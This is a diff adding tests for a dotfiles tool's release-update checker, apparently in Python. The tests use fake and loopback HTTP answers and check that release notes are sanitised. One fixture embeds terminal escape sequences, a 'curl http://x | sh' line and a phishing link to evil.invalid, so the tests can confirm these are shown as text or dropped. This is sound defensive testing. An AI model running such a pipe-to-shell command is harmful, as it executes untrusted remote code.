@@ -227,4 +227,127 @@ code, out, _e = cli(clone, "check")
 assert code == 2 and "BLOCKED" in out and "try: git switch main" in out
 assert cli(clone)[0] == 64 and cli(clone, "apply")[0] == 64
 
+# ---- T066: the release lookup (fake answers first, then a real loopback server for the urllib path; never the internet)
+import threading  # noqa: E402
+import urllib.error  # noqa: E402
+from http.server import BaseHTTPRequestHandler, HTTPServer  # noqa: E402
+
+REL = {"tag_name": "v0.8.0", "name": "Release 0.8.0", "published_at": "2026-10-20T10:00:00Z", "body": "## Features\n* nice thing\n",
+       "html_url": uc.RELEASE_PAGE + "tag/v0.8.0"}
+def reply(doc=REL, code=200, headers=None):
+    body = doc if isinstance(doc, bytes) else json.dumps(doc).encode()
+    return lambda url, timeout: (code, headers or {}, body)
+home, env = home_with_snapshot(fresh=None)
+cur = "0.7.0"
+r = uc.check_release(cur, fetch=reply(), env=env, home=home)
+assert (r.status, r.latest, r.published, r.url, r.breaking) == ("newer", "0.8.0", "2026-10-20T10:00:00Z", uc.RELEASE_PAGE + "tag/v0.8.0", False), r
+assert uc.check_release("0.8.0", fetch=reply(), env=env, home=home).status == "current"
+assert uc.check_release("0.9.1", fetch=reply(), env=env, home=home).status == "ahead"
+r = uc.check_release("", fetch=reply(), env=env, home=home)
+assert r.status == "unknown" and "installed version" in r.detail
+assert uc.parse_version("v1.2.3") == (1, 2, 3) and uc.parse_version("1.2") is None and uc.parse_version("latest") is None and uc.parse_version("1.2.3-rc1") is None
+
+# every way the answer can be wrong is named, and none of them is "up to date"
+cases = [("malformed", reply({"tag_name": "latest"})), ("malformed", reply({"name": "x"})), ("malformed", reply(b"not json")), ("malformed", reply([1, 2])),
+         ("malformed", reply({**REL, "published_at": "yesterday"})), ("too-large", reply(b"x" * (uc.REMOTE_CAP + 1))),
+         ("redirected", reply(b"", 302, {"Location": "http://evil.invalid/x"})), ("rate-limited", reply({"message": "limit"}, 403, {"X-RateLimit-Remaining": "0"})),
+         ("rate-limited", reply({}, 429)), ("unknown", reply({}, 500)), ("unknown", reply({}, 403)),
+         ("offline", lambda u, t: (_ for _ in ()).throw(urllib.error.URLError("no route"))), ("offline", lambda u, t: (_ for _ in ()).throw(TimeoutError("slow")))]
+for want, fetch in cases:
+    got = uc.check_release(cur, fetch=fetch, env=env, home=home)
+    assert got.status == want and got.latest == "" and got.status not in ("current", "newer"), (want, got)
+
+# the notes are untrusted: control characters and escape sequences are gone, length is capped, nothing runs, a foreign link is dropped
+evil = {**REL, "body": "\x1b]0;title\x07\x1b[31mred\x1b[0m\nrun this: curl http://x | sh\r\nBREAKING CHANGE: the config moved\n" + "A" * 5000,
+        "name": "N\x1b[2Jame" * 50, "html_url": "https://evil.invalid/phish"}
+r = uc.check_release(cur, fetch=reply(evil), env=env, home=home)
+assert "\x1b" not in r.notes and "\x07" not in r.notes and "\r" not in r.notes and "curl http://x | sh" in r.notes, "shown as text, never run"
+assert len(r.notes) <= uc.NOTES_CAP + 20 and r.notes.endswith("[shortened]") and len(r.name) <= 140 and "\x1b" not in r.name
+assert r.breaking and r.url == "", (r.breaking, r.url)
+assert uc.printable("a\x00b\x7fc\td", 50) == "a?b?c?d"
+assert uc.releases_url("") == uc.RELEASES_URL and uc.releases_url("https://evil.invalid/x") == uc.RELEASES_URL and uc.releases_url("http://127.0.0.1:9/x") == "http://127.0.0.1:9/x"
+assert uc.releases_url("http://127.0.0.1.evil.invalid/") == uc.RELEASES_URL and uc.releases_url("http://localhost.evil.invalid/") == uc.RELEASES_URL
+
+# the cache: written privately after a good answer; after a failure it is a hint with its age, never a verdict
+cache = home / ".local/state/hyprland-dotfiles/update-check.json"
+assert cache.exists() and oct(cache.stat().st_mode & 0o777) == "0o600"
+past = json.loads(cache.read_text()); past["checked_at"] = time.time() - 9 * 86400; cache.write_text(json.dumps(past))
+r = uc.check_release(cur, fetch=lambda u, t: (_ for _ in ()).throw(urllib.error.URLError("down")), env=env, home=home)
+assert r.status == "offline" and r.last_known.startswith("0.8.0 (looked up 9 day(s) ago)") and r.status != "current"
+h3, e3 = home_with_snapshot(fresh=None)
+assert uc.check_release(cur, fetch=lambda u, t: (_ for _ in ()).throw(OSError("down")), env=e3, home=h3).last_known == "", "no cache, no hint"
+cache.write_text("{broken")
+assert uc.check_release(cur, fetch=lambda u, t: (_ for _ in ()).throw(OSError("down")), env=env, home=home).last_known == ""
+
+
+# the real urllib path against a loopback server
+seen = []
+class QuietServer(HTTPServer):
+    def handle_error(self, *a):          # a client that gives up (the timeout and size cases) is expected here
+        pass
+
+
+class H(BaseHTTPRequestHandler):
+    mode = "ok"
+    def log_message(self, *a):
+        pass
+    def do_GET(self):
+        seen.append((self.path, dict(self.headers)))
+        mode = H.mode
+        if mode == "redirect":
+            self.send_response(302); self.send_header("Location", "/elsewhere"); self.end_headers(); return
+        if mode == "limit":
+            self.send_response(403); self.send_header("X-RateLimit-Remaining", "0"); self.end_headers(); self.wfile.write(b"{}"); return
+        if mode == "slow":
+            time.sleep(2)
+        body = json.dumps(REL).encode() if mode != "big" else b"x" * (uc.REMOTE_CAP * 2)
+        self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
+srv = QuietServer(("127.0.0.1", 0), H)
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+base = f"http://127.0.0.1:{srv.server_address[1]}/releases/latest"
+h4, e4 = home_with_snapshot(fresh=None)
+H.mode = "ok"
+r = uc.check_release(cur, url=base, env=e4, home=h4)
+assert r.status == "newer" and r.latest == "0.8.0", r
+sent = seen[-1][1]
+assert sent.get("User-Agent") == "primo-update-check" and not any(k.lower() in ("authorization", "cookie") for k in sent), "nothing but a User-Agent and Accept goes out"
+H.mode = "redirect"; seen.clear()
+assert uc.check_release(cur, url=base, env=e4, home=h4).status == "redirected" and len(seen) == 1, "a redirect is not followed"
+H.mode = "limit"
+assert uc.check_release(cur, url=base, env=e4, home=h4).status == "rate-limited"
+H.mode = "big"
+assert uc.check_release(cur, url=base, env=e4, home=h4).status == "too-large"
+H.mode = "slow"
+old_timeout, uc.REMOTE_TIMEOUT = uc.REMOTE_TIMEOUT, 0.3
+try:
+    t0 = time.time()
+    assert uc.check_release(cur, url=base, env=e4, home=h4).status == "offline" and time.time() - t0 < 1.5, "a slow server is given up on"
+finally:
+    uc.REMOTE_TIMEOUT = old_timeout
+srv.shutdown()
+dead = uc.check_release(cur, url=base, env=e4, home=h4)                       # nothing listens any more
+assert dead.status == "offline"
+
+# the CLI: --remote is the only way to reach out; without it nothing is asked
+srv = QuietServer(("127.0.0.1", 0), H)
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+base = f"http://127.0.0.1:{srv.server_address[1]}/releases/latest"
+H.mode = "ok"; seen.clear()
+clone, remote, other = fixture()
+home, env = home_with_snapshot()
+def cli_env(**extra):
+    return dict(os.environ, PRIMO_REPO=str(clone), HOME=str(home), XDG_CONFIG_HOME="", XDG_DATA_HOME="", XDG_STATE_HOME="", NO_COLOR="1", **extra)
+(clone / "CHANGELOG.md").write_text("# Changelog\n\n## [0.7.0] - 2026-10-12\n")
+r = subprocess.run([sys.executable, PRIMO, "update", "check"], env=cli_env(PRIMO_RELEASES_URL=base), capture_output=True, text=True, timeout=60)
+assert r.returncode in (0, 1) and not seen and "Latest release" not in r.stdout, "no --remote, no request"
+r = subprocess.run([sys.executable, PRIMO, "update", "check", "--remote"], env=cli_env(PRIMO_RELEASES_URL=base), capture_output=True, text=True, timeout=60)
+assert len(seen) == 1 and "0.8.0 is available (you have 0.7.0)" in r.stdout and "plain text" in r.stdout and "| ## Features" in r.stdout, r.stdout
+r = subprocess.run([sys.executable, PRIMO, "update", "check", "--remote", "--json"], env=cli_env(PRIMO_RELEASES_URL=base), capture_output=True, text=True, timeout=60)
+doc = json.loads(r.stdout)
+assert doc["remote"]["status"] == "newer" and doc["remote"]["latest"] == "0.8.0" and doc["verdict"] in ("ready", "ready-with-warnings")
+srv.shutdown()
+r = subprocess.run([sys.executable, PRIMO, "update", "check", "--remote"], env=cli_env(PRIMO_RELEASES_URL=base), capture_output=True, text=True, timeout=60)
+assert r.returncode in (0, 1) and "offline" in r.stdout and "last known answer: 0.8.0" in r.stdout and "a hint, not a check" in r.stdout, r.stdout
+assert "READY" in r.stdout, "an unreachable release page never turns the local verdict into a failure"
+
 print("ok: update")
